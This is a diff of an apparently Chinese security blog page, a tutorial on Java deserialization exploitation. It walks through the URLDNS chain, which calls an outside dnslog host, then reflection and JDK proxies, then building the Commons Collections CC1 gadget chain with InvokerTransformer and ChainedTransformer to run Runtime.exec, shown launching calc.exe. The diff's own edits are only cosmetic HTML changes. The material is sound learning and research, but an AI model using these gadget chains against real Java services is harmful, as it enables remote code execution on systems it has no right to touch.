 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;eating&quot;</span>, String.class);<br>method.invoke(p,<span class="hljs-string">&quot;apple&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>达到预期</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png"></p>
 <p>接下来就开始利用反射调URLDNS链，使其达到预期用于检测反序列化漏洞的目的：</p>
 <h3 id="利用反射调URLDNS链："><a href="#利用反射调URLDNS链：" class="headerlink" title="利用反射调URLDNS链："></a>利用反射调URLDNS链：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeTestApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://665eab82.dnslog.store.&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodeField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCodeField.set(url,<span class="hljs-number">114514</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        hashCodeField.set(url,-<span class="hljs-number">1</span>);<br>        Serialize.Serialize(hashMap);<br><span class="hljs-comment">//        Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;);</span><br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>在put之前将hashCode的值通过反射改为任意-1外的值，导致在调用put()方法时无法调用<code>hashCode()</code>方法，避免了因为put造成的影响查看DNS接受的数据，在put()调用之后，将hashCode的值再改为-1，满足readObject()方法中调用hashCode()的条件，序列化过程未接受到数据。</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeTestApplication</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;<br>        Unserialize.<span class="hljs-built_in">Unserialize</span>(<span class="hljs-string">&quot;src/main/java/com/test/serializetest/file/data.dat&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class SerializeTestApplication &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>反序列化过程中，会调用HashMap中readObect()中的hashCode()，同名方法也就会调用URL类中的<code>hashCode()</code>方法，因为hashCode值为-1，所以会调用hashCode()方法</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png"></p>
 <p>DNSLog接收到解析数据：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png"></p>
 <p>做个断点调试，在此处下断点，进行反序列化，发现从文件中读取进行反序列化的过程中hashCode的值是-1：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png"></p>
 <p>URLDNS链利用的是同名方法hashCode()，那如果想调用除了同名方法之外的方法呢？通过invoke()</p>
 <p>如果是像Runtime这样的没办法序列化的类呢？利用Class类来创建对象 </p>
 <h3 id="JDK代理："><a href="#JDK代理：" class="headerlink" title="JDK代理："></a>JDK代理：</h3><p>关于代理模式，<a target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/proxy.html#_2-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86">这篇文章</a>讲的非常清楚了，稍微整理一下内容：</p>
@@ -661,12 +314,12 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>		<span class="hljs-type">NetConnector</span> <span class="hljs-variable">netConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetConnector</span>();<br>        <span class="hljs-type">UserProxy</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxy</span>(netConnector);<br>        userProxy.connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>执行后输出：</p>
-<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Before connect()<br>you<span class="hljs-symbol">&#x27;ve</span> connected <span class="hljs-keyword">to</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-keyword">After</span> connect()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Before connect()<br>you&#x27;ve connected to 127.0.0.1<br>After connect()<br></code></pre></td></tr></table></figure>
 
 <p>静态代理存在非常大的缺陷，即如果接口一旦修改或者新增方法，目标对象和代理对象都要修改，非常麻烦。并且实现起来不够灵活，需要被代理和代理类都实现一遍接口，当然实现类要写很多方法是必然的，但是代理的时候要写很多就很麻烦了。静态代理是在编译时就将接口，目标类和代理类全都编译成了一个个class文件</p>
 <h4 id="动态代理："><a href="#动态代理：" class="headerlink" title="动态代理："></a>动态代理：</h4><p>动态代理技术主要运用的是java中Proxy类下的 <code>newProxyInstanc()</code>方法，方法源代码如下：</p>
 <p>其参数列表：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png"></p>
 <p>第一个参数是一个类加载器，java中基本上所有类的类加载器都相同；第二个是要代理的接口，可以传入多个，但是一般就一个，第三个参数是InvocationHandler类型的对象，下面会对InvocationHandler进行讲解</p>
 <p>定义接口IUser：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -675,7 +328,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;show&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;create&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;update&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>写一个类来实现InvocationHandler接口，该接口仅一个方法invoke()，需要重写：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png"></p>
 <p>重写的时候最主要的参数就是method，</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>   <span class="hljs-keyword">private</span> IUser user;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">(IUser user)</span>&#123;<br>       <span class="hljs-built_in">this</span>.user = user;<br>   &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        method.invoke(user,args);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -684,7 +337,7 @@
 
 <p>上面已经知道了 <code>newProxyInstanc()</code>方法返回Object类型，因此要转型成IUser接口类型</p>
 <p>在反序列化漏洞中的利用：</p>
-<h3 id="Common-Collections："><a href="#Common-Collections：" class="headerlink" title="Common Collections："></a>Common Collections：</h3><h4 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h4><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>	Gadget chain:<br>		ObjectInputStream.readObject()<br>			AnnotationInvocationHandler.readObject()<br>				Map(Proxy).entrySet()<br>					AnnotationInvocationHandler.invoke()<br>						LazyMap.get()<br>							ChainedTransformer<span class="hljs-built_in">.transform</span>()<br>								ConstantTransformer<span class="hljs-built_in">.transform</span>()<br>								InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>									Method.invoke()<br>										Class.getMethod()<br>								InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>									Method.invoke()<br>										Runtime.getRuntime()<br>								InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>									Method.invoke()<br>										Runtime.exec()<br> */<br></code></pre></td></tr></table></figure>
+<h3 id="Common-Collections："><a href="#Common-Collections：" class="headerlink" title="Common Collections："></a>Common Collections：</h3><h4 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/*<br>	Gadget chain:<br>		ObjectInputStream.readObject()<br>			AnnotationInvocationHandler.readObject()<br>				Map(Proxy).entrySet()<br>					AnnotationInvocationHandler.invoke()<br>						LazyMap.get()<br>							ChainedTransformer.transform()<br>								ConstantTransformer.transform()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Class.getMethod()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.getRuntime()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.exec()<br> */<br></code></pre></td></tr></table></figure>
 
 <p>环境Common Collections&lt;&#x3D;3.2.1：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
@@ -692,44 +345,44 @@
 <p>利用过程：</p>
 <p>Transform接口：</p>
 <p>Transform接口提供了一个transform()方法，传入一个对象对对象进行操作之后输出：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png"></p>
 <p>查看实现类（ctrl+h）：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png"></p>
 <p>重要的实现类有<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>、<code>TransformedMap</code></p>
 <p>ConstantTransformer类：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png"></p>
 <p>其中的transform()方法不管输入什么都返回一个常量类iConstant，iConstant在构造器中获得</p>
 <p>InvokerTransformer类：</p>
 <p>构造方法传入可控的方法名(methodName)，方法参数的类型(paramTypes)，调用的参数(iArgs)</p>
 <p>tranform()方法传入一个对象，获取这个对象的Class原型。。一整条下来是一个非常非常完美的反射链调用方法的过程</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png"></p>
 <p>这样即可触发计算器</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这里为 InvokerTransformer 类中的 transform()方法传入Runtime实例，同时通过构造方法传入了exec方法以及需要的参数类型(String.class)和参数值(calc)，我们之前提到了 transform 方法中的反射调用，所以成功弹出计算器。</p>
 <p>ChainedTransformer类：</p>
 <p>ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法，并且将上一个transform方法返回的类传递给下一个进行调用，形成(N….transform(C.transform(B.transform(A.transform(Object)))))这样的一条链，数组的下一个元素对象执行数组的上一个元素对象的方法。</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png"></p>
 <p>到这里为止可以构造一条链了：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.commoncollections;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc.exe&quot;</span>;<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;<span class="hljs-comment">//获取到了getRuntime方法</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                            Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                            <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;<span class="hljs-comment">//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步</span><br>                    ),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>            &#125;;<br>            <span class="hljs-comment">// 创建ChainedTransformer调⽤链对象</span><br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformedChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">// 执⾏对象转换操作</span><br>            transformedChain.transform(<span class="hljs-literal">null</span>);<br><br><br><br>        &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png"></p>
 <p>接下来就是看谁调用了InvokerTransformer类中的transformer()方法了，在寻找过程中如果发现a()方法调用了transformer()方法，就去找谁调用了a()方法，直到找到readObject()</p>
 <p>TransformedMap类：</p>
 <p>其checkSetValue()方法调用了transform()方法，跟进valueTransformer</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png"></p>
 <p>构造方法中给valueTransform赋值，</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png"></p>
 <p>但是构造方法为protected，在类里找，发现decorate()方法调用了构造器，可用于调用g构造函数</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png"></p>
 <p>继续寻找谁调用了checkSetValue()方法：</p>
 <p>在TransformedMap类的父类 AbstractInputCheckedMapDecorator下定义了类EntryMap类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapEntryDecorator</span> &#123;<br><br>    <span class="hljs-comment">/** The parent map */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(entry);<br>        <span class="hljs-built_in">this</span>.parent = parent;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        value = parent.checkSetValue(value);<br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>其中setValue()方法下调用了checkSetValue()方法，而这里的setValue()方法与Map.Entry下的相同</p>
-<p><img src="/image-20231121212303111.png" srcset="/img/loading.gif" lazyload alt="image-20231121212303111"></p>
+<p><img src="/image-20231121212303111.png" alt="image-20231121212303111"></p>
 <p>只需要传入的参数合适便能达到预期目的，关于Java中的Entry类：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2839888494xw/p/15042850.html">https://www.cnblogs.com/2839888494xw/p/15042850.html</a></p>
 <p>通过Map.entrySet()方法，获取到键值对，然后循环遍历，对每个键值对执行setValue()方法，便等同于执行了MapEntry下的setValue()方法，进而调用checkSetValue()方法，因为checkSetValue()只修改valueTransformer的值，所以decorate的时候只需要在键值的位置传入需要调用transform()方法的类</p>
@@ -744,384 +397,80 @@
 <p>AnnotationInvocationHandler类：</p>
 <p>在这之前先手动导入一下sun包，</p>
 <p>先<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">安装jdk源码</a>：</p>
-<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png" srcset="/img/loading.gif" lazyload></p>
